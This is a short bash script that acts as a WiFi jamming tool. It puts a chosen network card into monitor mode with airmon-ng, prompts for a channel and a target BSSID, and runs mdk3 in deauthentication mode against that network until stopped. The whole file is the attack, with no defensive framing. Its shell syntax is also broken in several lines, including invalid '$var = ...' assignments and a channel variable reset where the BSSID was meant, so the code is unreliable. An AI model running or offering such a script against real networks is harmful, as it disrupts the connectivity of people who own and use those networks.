#!/bin/bash

ifconfig

echo Enter the name of the network card you want to use
read netcard
$mon = "mon"
$netcard = $netcard$mon
airmon-ng start $netcard
echo Select the channel you want to jam (optionnal press enter to skip)
$channel = ""
read channel
echo Select the bssid of the computer you want to jam (optionnal press enter to skip)
$channel = ""
read bssid

mdk3 $netcard d -c $channel -b $bssid

echo PRESS CTRL+C TO STOP
